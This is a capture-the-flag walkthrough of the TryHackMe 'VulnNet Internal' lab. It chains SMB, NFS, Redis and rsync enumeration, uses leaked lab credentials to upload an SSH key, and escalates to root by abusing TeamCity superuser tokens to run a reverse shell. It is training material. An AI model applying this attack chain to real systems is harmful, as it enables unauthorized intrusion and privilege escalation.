---
title: Walkthrough - VulnNet Internal
published: true
---

Linux, Enumeration, Pivoting, Privilege Escalation, rsync, smb. VulnNet Entertainment learns from its mistakes, and now they have something new for you...

[https://tryhackme.com/room/vulnnetinternal](https://tryhackme.com/room/vulnnetinternal)

* * *

## Notes

> VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings. 

- nmap scans

```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35475/tcp6  mountd
|   100005  1,2,3      45779/tcp   mountd
|   100005  1,2,3      50732/udp6  mountd
|   100005  1,2,3      56879/udp   mountd
|   100021  1,3,4      37577/tcp6  nlockmgr
|   100021  1,3,4      45989/tcp   nlockmgr
|   100021  1,3,4      49367/udp   nlockmgr
|   100021  1,3,4      59397/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
42811/tcp open     mountd      1-3 (RPC #100005)
44447/tcp open     java-rmi    Java RMI
45779/tcp open     mountd      1-3 (RPC #100005)
45989/tcp open     nlockmgr    1-4 (RPC #100021)
52013/tcp open     mountd      1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-08-08T20:17:47+02:00
| smb2-time: 
|   date: 2022-08-08T18:17:47
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

- Download everything from the smb share. ``smbclient -W 'VULNNET-INTERNAL' //'10.10.114.111'/shares -U 'guest' ``, ``mask ""``, ``recurse ON``, ``prompt OFF``, ``mget *``.

- ``/data``

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet/data]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet/data]
└─$ cat data.txt        
Purge regularly data that is not needed anymore
```

##   port 873 - rsync

Rsync is a fast incremental backup tool. Is transfers and syncs files accross different directories on the same machine, or another machine on the network. The good thing about rstnc is it only syncs and transfers files that are different, no duplicates. 

- list files ``rsync 10.10.114.111::``
- ``rsync -av --list-only rsync://10.10.114.111/files``
- we need authentication to login and once we have the auth we can access the files

##   port 2049 - nfs

- ``showmount -e 10.10.114.111``

```
Export list for 10.10.114.111:
/opt/conf *
```

- ``mkdir mount``
- ``sudo mount -t nfs 10.10.114.111: mount``

we can explore this share with ``tree``

- find the password within ``redis/redis.conf``

##   port 6379 - redis

Redis is an open source (BSD licensed), in-memory data structure store used as a database, cache, message broker, and streaming engine. [https://redis.io/docs/about/](https://redis.io/docs/about/)

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet]
└─$ nc -vn 10.10.114.111 6379                        
(UNKNOWN) [10.10.114.111] 6379 (redis) open
info
-NOAUTH Authentication required.
```

- We need authentication to access the database. We can use the requirepass that we found withing the .conf file "B65Hx562F@ggAZ@F"

- ``redis-cli -h 10.10.114.111``
- ``AUTH B65Hx562F@ggAZ@F``

We can try to dump the database. Inside Redis the databases are numbers startting from 0. We can find these in the ``# Keyspace`` 

```
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.10.114.111:6379> 
```

```
10.10.114.111:6379[1]> SELECT 0
OK
10.10.114.111:6379> KEYS *
1) "internal flag"
2) "int"
3) "marketlist"
4) "authlist"
5) "tmp"
```

![0xskar](/assets/vulnnet-internal01.png)

- ``LRANGE authlist 1 100`` give us a base64 to decode

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet]
└─$ base64 -d authlist.b64               
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

- ``rsync --list-only rsync://rsync-connect@10.10.114.111/files``
- ``rsync --list-only rsync://rsync-connect@10.10.114.111/files/sys-internal/``
- ``rsync authorized_keys rsync://rsync-connect@10.10.114.111/files/sys-internal/.ssh/``

seeing that is the the users home dir we can upload authorized key and ssh in

- ``ssh-keygen -t rsa``

and finally

- ``ssh sys-internal@10.10.114.111 -i vulnnet``

* * * 

## What is the services flag? (services.txt)

- located in ``/temp`` in the smb share

* * * 

## What is the internal flag? ("internal flag")

![0xskar](/assets/vulnnet-internal01.png)

* * * 

## What is the user flag? (user.txt)

![0xskar](/assets/vulnnet-internal02.png)

* * * 

## What is the root flag? (root.txt)

- We find a folder on the root directory ``/TeamCity/`` but we dont have permissions to start the server or use it. 
- ``ps aux`` TeamCity is run at root so we can maybe find a possible way to connect to the server
- Viewing the readme we get the following: 

> By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

- We should be able to create a tunnel to expose this application to our internet. to be able to addess this and then use that to exploit vulnerabities that Teamcity has.

- ``ssh -L 8111:localhost:8111 sys-internal@10.10.115.21 -i vulnnet`` this creates a tunnel to port 8111 we can access on our localhost.

![0xskar](/assets/vulnnet-internal03.png)

> The authentication token is automatically generated on every server start. The token is printed in the server console and teamcity-server.log under the TeamCity\logs directory (search for the "Super user authentication token" text). The line is printed on the server start and on any login page submit without a username specified.

- We unfortunatly dont have permissions to view this log, however ``grep -iR token /TeamCity/logs/ 2>/dev/null`` leads us to more tokens we can try, and the last token gives us access.

```
sys-internal@vulnnet-internal:/TeamCity/logs$ grep -iR token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1795373678433474178 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1795373678433474178 (use empty username with the token as the password to access the server)
```

So because teamcity is being ran as root if we can get it to run a reverse shell we can gain access as root. We need to create a command line build in teamcity. and past in a python rev shell to get us our reverse shell.

Setup a netcat listen to recieve the connection, and select run in teamcity.

![0xskar](/assets/vulnnet-internal04.png)

* * * 

